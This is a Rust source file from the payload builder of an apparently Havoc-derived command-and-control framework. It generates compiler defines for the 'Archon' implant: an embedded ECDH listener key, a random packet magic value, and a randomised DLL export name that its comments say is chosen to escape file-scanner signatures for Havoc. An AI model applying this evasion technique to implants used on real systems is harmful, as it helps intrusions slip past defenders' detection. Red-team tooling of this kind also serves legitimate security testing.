use super::super::PayloadBuildError;
use super::define_utils::{format_config_bytes, validate_define};

/// Generate the compiler defines that enable ECDH session key exchange in Archon.
///
/// Produces two defines:
/// - `ARCHON_ECDH_MODE` — activates the `#ifdef ARCHON_ECDH_MODE` code paths.
/// - `ARCHON_LISTENER_PUBKEY={0x..,...}` — embeds the 32-byte X25519 public
///   key so the agent can compute the ECDH shared secret without any plaintext
///   key material in the init packet.
pub(in super::super) fn archon_ecdh_defines(
    pub_key: &[u8; 32],
) -> Result<Vec<String>, PayloadBuildError> {
    let mode_define = "ARCHON_ECDH_MODE".to_owned();
    validate_define(&mode_define)?;
    let key_define = format!("ARCHON_LISTENER_PUBKEY={{{}}}", format_config_bytes(pub_key));
    validate_define(&key_define)?;
    Ok(vec![mode_define, key_define])
}

/// Generate a random 4-byte Archon magic value and return the corresponding
/// `-D` define string together with the raw `u32` value.
///
/// The define is injected as `-DARCHON_MAGIC_VALUE=0x<hex>` so the C compiler
/// overrides the fallback constant in `Defines.h`.  The returned `u32` is
/// stored in the agent record on first check-in and used to validate every
/// subsequent Archon packet before AES decryption.
///
/// The function guarantees that the generated value is never `0xDEADBEEF` so
/// that Archon traffic cannot be confused with legacy Demon traffic.
pub(in super::super) fn generate_archon_magic() -> Result<(String, u32), PayloadBuildError> {
    let mut bytes = [0u8; 4];
    loop {
        getrandom::fill(&mut bytes).map_err(|e| PayloadBuildError::ToolchainUnavailable {
            message: format!("failed to generate random Archon magic: {e}"),
        })?;
        let magic = u32::from_be_bytes(bytes);
        if magic != 0xDEAD_BEEF {
            let define = format!("ARCHON_MAGIC_VALUE=0x{magic:08X}");
            validate_define(&define)?;
            return Ok((define, magic));
        }
    }
}

/// Generate a random Archon DLL export name and return the corresponding `-D`
/// define string together with the identifier itself.
///
/// The identifier has the form `Arc<16 random hex digits>` (e.g. `Arc3f8b1a…`)
/// which is always a valid C identifier regardless of compiler flags.  The
/// define is injected as `-DDEMON_EXPORT_NAME=<id>` so the C compiler sets the
/// DLL export name in `MainDll.c` to the generated identifier rather than the
/// well-known `Start` name that is flagged by file scanners as a Havoc signature.
///
/// The returned identifier string is stored in the `PayloadArtifact` so the
/// payload generator can record which export to invoke.
pub(in super::super) fn generate_archon_export_name() -> Result<(String, String), PayloadBuildError>
{
    let mut bytes = [0u8; 8];
    getrandom::fill(&mut bytes).map_err(|e| PayloadBuildError::ToolchainUnavailable {
        message: format!("failed to generate random Archon export name: {e}"),
    })?;
    let hex: String = bytes.iter().map(|b| format!("{b:02x}")).collect();
    let identifier = format!("Arc{hex}");
    let define = format!("DEMON_EXPORT_NAME={identifier}");
    validate_define(&define)?;
    Ok((define, identifier))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn archon_ecdh_defines_produces_mode_flag() -> Result<(), Box<dyn std::error::Error>> {
        let key = [0u8; 32];
        let defines = archon_ecdh_defines(&key)?;
        assert!(
            defines.iter().any(|d| d == "ARCHON_ECDH_MODE"),
            "ARCHON_ECDH_MODE define missing; got: {defines:?}"
        );
        Ok(())
    }

    #[test]
    fn archon_ecdh_defines_embeds_pubkey_bytes() -> Result<(), Box<dyn std::error::Error>> {
        let mut key = [0u8; 32];
        key[0] = 0xAB;
        key[31] = 0xCD;
        let defines = archon_ecdh_defines(&key)?;
        let key_define = defines
            .iter()
            .find(|d| d.starts_with("ARCHON_LISTENER_PUBKEY="))
            .expect("ARCHON_LISTENER_PUBKEY define missing");
        assert!(key_define.contains("0xab"), "first byte 0xab not found in define: {key_define}");
        assert!(key_define.contains("0xcd"), "last byte 0xcd not found in define: {key_define}");
        assert!(
            key_define.starts_with("ARCHON_LISTENER_PUBKEY={"),
            "define should use C array initialiser syntax"
        );
        assert!(key_define.ends_with('}'), "define should end with closing brace");
        Ok(())
    }

    #[test]
    fn archon_ecdh_defines_returns_exactly_two_defines() -> Result<(), Box<dyn std::error::Error>> {
        let key = [0xFFu8; 32];
        let defines = archon_ecdh_defines(&key)?;
        assert_eq!(defines.len(), 2, "expected exactly [ARCHON_ECDH_MODE, ARCHON_LISTENER_PUBKEY]");
        Ok(())
    }

    #[test]
    fn archon_ecdh_defines_key_has_32_bytes() -> Result<(), Box<dyn std::error::Error>> {
        let key = [0x12u8; 32];
        let defines = archon_ecdh_defines(&key)?;
        let key_define = defines
            .iter()
            .find(|d| d.starts_with("ARCHON_LISTENER_PUBKEY="))
            .expect("ARCHON_LISTENER_PUBKEY define missing");
        // Count occurrences of "0x" — should be 32 (one per byte).
        let count = key_define.matches("0x").count();
        assert_eq!(
            count, 32,
            "expected 32 byte values in define, got {count}; define: {key_define}"
        );
        Ok(())
    }

    #[test]
    fn generate_archon_export_name_produces_valid_c_identifier() {
        let (define, name) = generate_archon_export_name().expect("should not fail");
        // Identifier must start with a letter (C standard).
        let first = name.chars().next().expect("identifier must be non-empty");
        assert!(first.is_ascii_alphabetic(), "identifier must start with a letter; got: {name}");
        // All remaining characters must be alphanumeric or underscore.
        assert!(
            name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'),
            "identifier contains invalid characters: {name}"
        );
        // Define must be `DEMON_EXPORT_NAME=<identifier>`.
        assert_eq!(define, format!("DEMON_EXPORT_NAME={name}"));
    }

    #[test]
    fn generate_archon_export_name_has_arc_prefix() {
        let (_define, name) = generate_archon_export_name().expect("should not fail");
        assert!(name.starts_with("Arc"), "export name should start with 'Arc'; got: {name}");
    }

    #[test]
    fn generate_archon_export_name_is_unique_across_calls() {
        let (_d1, n1) = generate_archon_export_name().expect("call 1");
        let (_d2, n2) = generate_archon_export_name().expect("call 2");
        // Two independent calls should produce different identifiers (with overwhelming probability).
        assert_ne!(n1, n2, "two export name generations returned the same identifier");
    }

    #[test]
    fn generate_archon_export_name_never_equals_start() {
        for _ in 0..100 {
            let (_define, name) = generate_archon_export_name().expect("should not fail");
            assert_ne!(name, "Start", "export name must not be the well-known 'Start' identifier");
        }
    }
}
